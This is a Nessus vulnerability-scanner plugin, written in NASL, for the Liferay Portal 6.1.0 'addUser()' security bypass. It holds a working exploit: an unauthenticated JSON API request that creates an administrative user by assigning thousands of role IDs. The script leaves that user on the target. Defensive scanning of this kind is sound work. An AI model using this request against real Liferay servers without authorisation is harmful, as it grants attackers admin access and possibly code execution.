#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(59232);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/11/23 20:31:33 $");

  script_bugtraq_id(53185, 53186);
  script_osvdb_id(81278, 81291);

  script_name(english:"Liferay Portal 6.1.0 'addUser()' Security Bypass");
  script_summary(english:"Attempts to create a new administrative user");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Java application affected by a
security bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Liferay Portal hosted on the remote web server
contains a flaw in the 'UserServiceUtil' class's 'addUser' method that
allows a remote, unauthenticated attacker to create new administrative
users. Since administrative users can install new plugins and
extensions, this may lead to arbitrary code execution.

In addition, this version of Liferay Portal may be affected by a
reconfiguration vulnerability that may allow the backing store to be
switched to an arbitrary, attacker-controlled server. However, Nessus 
has not tested for this.");

  script_set_attribute(attribute:"solution", value:
"Update to a version after 6.1.0 or use the newest version in SVN.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"see_also", value:"https://github.com/jelmerk/LPS-24562-proof");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/04/21");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/04/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/05/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:liferay:portal");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("liferay_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/liferay_portal");
  script_require_ports("Services/www", 80, 443, 8080);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("webapp_func.inc");

# Get the ports that web servers have been found on, defaulting to
# what Liferay uses with Tomcat, their recommended bundle.
port = get_http_port(default:8080);

# Get details of the Liferay Portal install.
install = get_install_from_kb(appname:"liferay_portal", port:port, exit_on_fail:TRUE);
dir = install["dir"];

# The company 'liferay.com' exists by default.
#
# getCompanyByWebId() is documented at:
#   http://www.nessus.org/u?9f6e5728
#
# Success looks like:
#   {"accountId":7,"active":true,"companyId":1,"homeURL":"",
#    "key":null,"logoId":0,"maxUsers":0,"mx":"liferay.com",
#    "system":false,"webId":"liferay.com"}
#
# Failure looks like:
#   {"exception":...}
params = "?webId=liferay.com";

loc = dir + "/api/jsonws/company/get-company-by-web-id/";
url = build_url(port:port, qs:loc);
res = http_send_recv3(
  port            : port,
  method          : "GET",
  item            : loc + params,
  exit_on_fail    : TRUE
);

if (res[2] == "") audit(AUDIT_WEB_APP_NOT_AFFECTED, "Liferay Portal", build_url(port:port, qs:dir));

if (
  res[2] =~ '^ *{ *"exception" *:' ||
  res[2] !~ '"webId" *: *"liferay.com"'
) exit(1, "Failed to find the webId of liferay.com from " + url + ".");

# Extract the companyId from the JSON response.
matches = eregmatch(string:res[2], pattern:'"companyId":([0-9]+)');
if (isnull(matches)) exit(1, "Failed to extract the companyId of liferay.com from the JSON returned by " + url + ".");
company = matches[1];

# Users have roles, but we can't look them up by name. According to
# the PoC, the default install doesn't have roles past ID 11,000.
role_lo = 0;
role_hi = 10999;

roles = role_lo;
for (i = 1; i <= role_hi; i++)
{
  roles += "," + i;
}

# Create a nonce to be used for our new user's screen name, since we
# don't want to run into the case that only the first scan with this
# plugin works due to name collisions.
#
# We can't include the plugin's name due to length restrictions.
nonce = "nessus-" +  unixtime();

# addUser() is documented at: http://www.nessus.org/u?c8096a56
#
# Success looks like:
#   {...,"companyId":1,"contactId":10528,"firstName":"Nessus",...,
#    "lastName":"Scanner",...,"screenName":"nessus-1336148685",...,
#    "userId":10527,"uuid":"8069f1b6-5b4d-4bd0-9e5b-15be7f65df55"}
#
# Failure looks like:
#   {"exception":...}
params =
  "?companyId=" + company +
  "&autoPassword=true" +
  "&password1=" +
  "&password2=" +
  "&autoScreenName=false" +
  "&screenName=" + nonce +
  "&emailAddress=" + nonce + "@example.com" +
  "&facebookId=0" +
  "&openId=" +
  "&locale=en_US" +
  "&firstName=Nessus" +
  "&middleName=" +
  "&lastName=Scanner" +
  "&prefixId=0" +
  "&suffixId=0" +
  "&male=true" +
  "&birthdayMonth=1" +
  "&birthdayDay=1" +
  "&birthdayYear=1970" +
  "&jobTitle=" +
  "&groupIds=" +
  "&organizationIds=" +
  "&roleIds=" + roles +
  "&userGroupIds=" +
  "&sendEmail=false";

loc = dir + "/api/jsonws/user/add-user";
url = build_url(port:port, qs:url);
res = http_send_recv3(
  port            : port,
  method          : "POST",
  item            : loc,
  add_headers     : make_array("Content-Type", "application/x-www-form-urlencoded"),
  data            : params,
  exit_on_fail    : TRUE
);

if (
  res[2] =~ '^ *{ *"exception" *:' ||
  res[2] !~ '"screenName" *: *"' + nonce + '"'
) exit(1, "Failed to create a user through " + url + ".");

# Save the request to display in the report, filtering out the
# thousands of roles.
req = http_last_sent_request();
req = str_replace(string:req, find:roles, replace:role_lo + ",...," + role_hi);

# Report our findings.
report = NULL;
if (report_verbosity > 0)
{
  report =
    '\nNessus was able to create a new user with administrative permissions' +
    '\nthrough the JSON API :' +
    '\n' +
    '\n  Screen Name : ' + nonce +
    '\n  First Name  : Nessus' +
    '\n  Last Name   : Scanner' +
    '\n';

  if (report_verbosity > 1)
  {
    report +=
      '\nThe following HTTP request was used to create the user :'+
      '\n' +
      '\n  ' + join(split(req, sep:'\r\n', keep:FALSE), sep:'\n  ') +
      '\n';
  }

  report +=
    '\nNessus has not removed the user that it created. It is recommended' +
    '\nthat you delete it yourself.' +
    '\n';
}

security_hole(port:port, extra:report);
